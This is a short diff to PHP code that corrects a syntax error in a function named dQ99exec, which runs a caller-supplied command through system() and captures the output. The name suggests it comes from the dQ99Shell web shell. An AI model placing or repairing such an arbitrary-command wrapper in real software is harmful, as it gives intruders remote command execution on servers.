@@ -1,6 +1,6 @@
 <?php
 function dQ99exec($cmd) {
-    $@ob_start(); 
+    @ob_start(); 
 	system($cmd); 
 	$output = @ob_get_contents(); 
 	@ob_end_clean();
